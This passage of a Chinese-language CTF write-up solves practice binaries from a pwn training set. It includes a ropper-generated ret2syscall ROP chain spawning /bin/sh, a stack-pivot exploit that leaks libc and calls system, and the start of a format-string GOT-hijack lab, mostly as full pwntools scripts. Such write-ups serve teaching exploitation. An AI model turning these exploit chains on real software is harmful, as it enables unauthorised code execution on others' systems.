<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x0005215d</span><span class="p">)</span> <span class="c1"># 0x0809a15d: mov dword ptr [edx], eax; ret; </span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x000001c9</span><span class="p">)</span> <span class="c1"># 0x080481c9: pop ebx; ret; </span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x000a3060</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x0009e910</span><span class="p">)</span> <span class="c1"># 0x080e6910: pop ecx; push cs; or al, 0x41; ret; </span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x000a3068</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x0002682a</span><span class="p">)</span> <span class="c1"># 0x0806e82a: pop edx; ret; </span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x000a3068</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x00072e06</span><span class="p">)</span> <span class="c1"># 0x080bae06: pop eax; ret; </span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0000000b</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x00026ef0</span><span class="p">)</span> <span class="c1"># 0x0806eef0: int 0x80; ret; </span>
<span class="k">print</span> <span class="n">rop</span>
<span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">rop</span> <span class="n">chain</span> <span class="n">generated</span><span class="err">!</span>
</code></pre></td></tr></table>
</div>
</div><p>简单介绍一下原理，通过一系列 pop|ret 等gadget，使得 eax = 0xb（execve 32 位下的系统调用号），ebx -&gt; /bin/sh， ecx = edx = 0，然后通过 <code>int 0x80</code> 实现系统调用，执行 execve(&quot;/bin/sh&rdquo;, 0, 0)，实际上构造了一个 ret2syscall 的rop chain, hackme.inndy 上也有一道类似的题目<a href="http://www.cnblogs.com/WangAoBo/p/7706719.html#_label3"><strong>ROP2</strong></a></p>
<blockquote>
<p>ret2syscall 的更多细节可以参考 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/basic_rop/#ret2syscall">ctf-wiki</a></p>
</blockquote>
<p>而当观察 ropper 等工具自动生成的 ropchain 时，会发现有很多步骤是很繁琐的，可以做出很多优化，给一个优化后的例子</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># Generated by ropper ropchain generator #</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>

<span class="n">p</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>

<span class="n">IMAGE_BASE_0</span> <span class="o">=</span> <span class="mh">0x08048000</span> <span class="c1"># ./simplerop</span>
<span class="n">rebase_0</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="n">p</span><span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="n">IMAGE_BASE_0</span><span class="p">)</span>

<span class="n">pop_edx_ecx_ebx</span> <span class="o">=</span> <span class="mh">0x0806e850</span>

<span class="n">rop</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>

<span class="c1"># write /bin/sh\x00 to 0x08048000 + 0x000a3060</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x00072e06</span><span class="p">)</span> <span class="c1"># 0x080bae06: pop eax; ret; </span>
<span class="c1">#  rop += &#39;//bi&#39;</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="s1">&#39;/bin&#39;</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x0002682a</span><span class="p">)</span> <span class="c1"># 0x0806e82a: pop edx; ret; </span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x000a3060</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x0005215d</span><span class="p">)</span> <span class="c1"># 0x0809a15d: mov dword ptr [edx], eax; ret; </span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x00072e06</span><span class="p">)</span> <span class="c1"># 0x080bae06: pop eax; ret; </span>
<span class="n">rop</span> <span class="o">+=</span> <span class="s1">&#39;/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x0002682a</span><span class="p">)</span> <span class="c1"># 0x0806e82a: pop edx; ret; </span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x000a3064</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x0005215d</span><span class="p">)</span> <span class="c1"># 0x0809a15d: mov dword ptr [edx], eax; ret; </span>
<span class="k">print</span> <span class="s2">&#34;[+]write /bin/sh</span><span class="se">\x00</span><span class="s2"> to 0x08048000 + 0x000a3060&#34;</span>

<span class="c1">#  rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; </span>
<span class="c1">#  rop += p(0x00000000)</span>
<span class="c1">#  rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; </span>
<span class="c1">#  rop += rebase_0(0x000a3068)</span>
<span class="c1">#  rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; </span>
<span class="c1">#  rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; </span>
<span class="c1">#  rop += rebase_0(0x000a3060)</span>
<span class="c1">#  rop += rebase_0(0x0009e910) # 0x080e6910: pop ecx; push cs; or al, 0x41; ret; </span>
<span class="c1">#  rop += rebase_0(0x000a3068)</span>
<span class="c1">#  rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; </span>
<span class="c1">#  rop += rebase_0(0x000a3068)</span>

<span class="c1"># set ebx -&gt; /bin/sh\x00, ecx = edx = 0</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">,</span> <span class="n">pop_edx_ecx_ebx</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x000a3060</span><span class="p">)</span>
<span class="k">print</span> <span class="s2">&#34;[+]set ebx -&gt; /bin/sh</span><span class="se">\x00</span><span class="s2">, ecx = edx = 0&#34;</span>

<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x00072e06</span><span class="p">)</span> <span class="c1"># 0x080bae06: pop eax; ret; </span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0000000b</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x00026ef0</span><span class="p">)</span> <span class="c1"># 0x0806eef0: int 0x80; ret; </span>
<span class="n">asset</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">100</span> <span class="o">-</span> <span class="mi">32</span>
</code></pre></td></tr></table>
</div>
</div><p>注释都已经写在代码里了，主要优化了将 /bin/sh\x00 读入以及设置 ebx，ecx，edx 等寄存器的过程</p>
<blockquote>
<p>或者直接 return 到 read 函数，将 /bin/sh\x00 read 到 bss/data 段，能得到更短的 ropchain, 解决方法有很多,不再细说</p>
</blockquote>
<p>最终脚本:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">lab5</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">solve</span><span class="o">.</span><span class="n">py</span> 
<span class="c1">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>

<span class="n">p</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>

<span class="n">IMAGE_BASE_0</span> <span class="o">=</span> <span class="mh">0x08048000</span> <span class="c1"># ./simplerop</span>
<span class="n">rebase_0</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="n">p</span><span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="n">IMAGE_BASE_0</span><span class="p">)</span>

<span class="n">pop_edx_ecx_ebx</span> <span class="o">=</span> <span class="mh">0x0806e850</span>

<span class="n">rop</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>

<span class="c1"># write /bin/sh\x00 to 0x08048000 + 0x000a3060</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x00072e06</span><span class="p">)</span> <span class="c1"># 0x080bae06: pop eax; ret; </span>
<span class="c1">#  rop += &#39;//bi&#39;</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="s1">&#39;/bin&#39;</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x0002682a</span><span class="p">)</span> <span class="c1"># 0x0806e82a: pop edx; ret; </span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x000a3060</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x0005215d</span><span class="p">)</span> <span class="c1"># 0x0809a15d: mov dword ptr [edx], eax; ret; </span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x00072e06</span><span class="p">)</span> <span class="c1"># 0x080bae06: pop eax; ret; </span>
<span class="n">rop</span> <span class="o">+=</span> <span class="s1">&#39;/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x0002682a</span><span class="p">)</span> <span class="c1"># 0x0806e82a: pop edx; ret; </span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x000a3064</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x0005215d</span><span class="p">)</span> <span class="c1"># 0x0809a15d: mov dword ptr [edx], eax; ret; </span>
<span class="k">print</span> <span class="s2">&#34;[+]write /bin/sh</span><span class="se">\x00</span><span class="s2"> to 0x08048000 + 0x000a3060&#34;</span>

<span class="c1">#  rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; </span>
<span class="c1">#  rop += p(0x00000000)</span>
<span class="c1">#  rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; </span>
<span class="c1">#  rop += rebase_0(0x000a3068)</span>
<span class="c1">#  rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; </span>
<span class="c1">#  rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; </span>
<span class="c1">#  rop += rebase_0(0x000a3060)</span>
<span class="c1">#  rop += rebase_0(0x0009e910) # 0x080e6910: pop ecx; push cs; or al, 0x41; ret; </span>
<span class="c1">#  rop += rebase_0(0x000a3068)</span>
<span class="c1">#  rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; </span>
<span class="c1">#  rop += rebase_0(0x000a3068)</span>

<span class="c1"># set ebx -&gt; /bin/sh\x00, ecx = edx = 0</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">,</span> <span class="n">pop_edx_ecx_ebx</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x000a3060</span><span class="p">)</span>
<span class="k">print</span> <span class="s2">&#34;[+]set ebx -&gt; /bin/sh</span><span class="se">\x00</span><span class="s2">, ecx = edx = 0&#34;</span>

<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x00072e06</span><span class="p">)</span> <span class="c1"># 0x080bae06: pop eax; ret; </span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0000000b</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x00026ef0</span><span class="p">)</span> <span class="c1"># 0x0806eef0: int 0x80; ret; </span>
<span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">100</span> <span class="o">-</span> <span class="mi">32</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./simplerop&#34;</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span> <span class="o">+</span> <span class="n">rop</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; :&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="lab6-migration">lab6-migration</h3>
<p>栈迁移的问题，可以看出这个题目比起暴力的栈溢出做了两点限制：</p>
<ul>
<li>
<p>每次溢出只有 0x40-0x28-0x4=<strong>20</strong> 个字节的长度可以构造 ropchain</p>
</li>
<li>
<p>通过</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">  <span class="k">if</span> <span class="p">(</span> <span class="n">count</span> <span class="o">!=</span> <span class="mi">1337</span> <span class="p">)</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div></li>
</ul>
<p>限制了我们只能利用一次 main 函数的溢出（如果能 leak 出栈地址的话, 可以在栈上构造 rop chain 并控制返回地址 ret 到栈上的 rop chain)</p>
<p>所以我们就只能通过 20 个字节的 ropchain 来进行 rop 了，关于栈迁移（又称为 stack-pivot）可以看这个 <a href="https://github.com/M4xW4n9/slides/blob/master/pwn_stack/DEP%20%26%20ROP.pdf%0A"><strong>slide</strong></a></p>
<blockquote>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/others/#stack-pivoting">ctf-wiki</a> 上对 stack pivot 也有较为详细的介绍</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/M4xW4n9/slides/master/pwn_stack/stackPivot.jpg" alt="stackPivot"></p>
<p>我的exp：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">lab6</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">solve</span><span class="o">.</span><span class="n">py</span> 
<span class="c1">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;deepin-terminal&#34;</span><span class="p">,</span> <span class="s2">&#34;-x&#34;</span><span class="p">,</span> <span class="s2">&#34;sh&#34;</span><span class="p">,</span> <span class="s2">&#34;-c&#34;</span><span class="p">]</span> 
<span class="k">def</span> <span class="nf">DEBUG</span><span class="p">():</span>
    <span class="nb">raw_input</span><span class="p">(</span><span class="s2">&#34;DEBUG: &#34;</span><span class="p">)</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./migration&#34;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>

<span class="c1">#  bufAddr = elf.bss()</span>
<span class="n">bufAddr</span> <span class="o">=</span> <span class="mh">0x0804a000</span>
<span class="n">readPlt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&#34;read&#34;</span><span class="p">]</span>
<span class="n">readGot</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&#34;read&#34;</span><span class="p">]</span>
<span class="n">putsPlt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&#34;puts&#34;</span><span class="p">]</span>
<span class="n">p1ret</span> <span class="o">=</span> <span class="mh">0x0804836d</span>
<span class="n">p3ret</span> <span class="o">=</span> <span class="mh">0x08048569</span>
<span class="n">leaveRet</span> <span class="o">=</span> <span class="mh">0x08048504</span>


<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./migration&#34;</span><span class="p">)</span>
<span class="c1">#  DEBUG()</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x28</span><span class="p">),</span> <span class="n">bufAddr</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">,</span> <span class="n">readPlt</span><span class="p">,</span> <span class="n">leaveRet</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">bufAddr</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">])</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34; :</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="n">bufAddr</span> <span class="o">+</span> <span class="mh">0x600</span><span class="p">,</span> <span class="n">putsPlt</span><span class="p">,</span> <span class="n">p1ret</span><span class="p">,</span> <span class="n">readGot</span><span class="p">,</span> <span class="n">readPlt</span><span class="p">,</span> <span class="n">leaveRet</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">bufAddr</span> <span class="o">+</span> <span class="mh">0x600</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">])</span>
<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="c1">#  print io.recv()</span>
<span class="n">libcBase</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()[:</span> <span class="mi">4</span><span class="p">])</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
<span class="n">success</span><span class="p">(</span><span class="s2">&#34;libcBase -&gt; {:#x}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">libcBase</span><span class="p">))</span>
<span class="n">pause</span><span class="p">()</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="n">bufAddr</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">,</span> <span class="n">readPlt</span><span class="p">,</span> <span class="n">p3ret</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">bufAddr</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="n">libcBase</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">],</span> <span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="n">bufAddr</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">])</span>
<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;$0</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><p>稍微解释一下，先通过主函数中可以控制的 20个 字节将 esp 指针劫持到可控的 bss 段，然后就可以可以在 bss 段为所欲为了。</p>
<p>关于 stack-pivot，pwnable.kr 的 simple_login 是很经典的题目，放上一篇这道题的很不错的 <a href="https://blog.csdn.net/yuanyunfeng3/article/details/51456049"><strong>wp</strong></a></p>
<p>这个还有个问题，sendline 会 gg，send 就可以，在 atum 大佬的 <a href="http://atum.li/2016/09/20/ctf-strange/"><strong>博客</strong></a> 上找到了原因
另外不建议把迁移后的栈放在 bss 段开头, 因为 stdout, stdin, stderr 等结构体往往存储在这里, 破坏这些结构体很可能会引起输入输出的错误</p>
<h3 id="lab7-crack">lab7-crack</h3>
<p>输出 name 时有明显的格式化字符串漏洞，这个题的思路有很多，可以利用 fsb 改写 password，或者 leak 出 password，也可以直接通过 fsb，hijack puts_got 到 system(&ldquo;cat flag&rdquo;) 处（注意这里 printf 实际调用了 puts）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">lab7</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">hijack</span><span class="o">.</span><span class="n">py</span> 
<span class="c1">#!/usr/bin/env python</span>
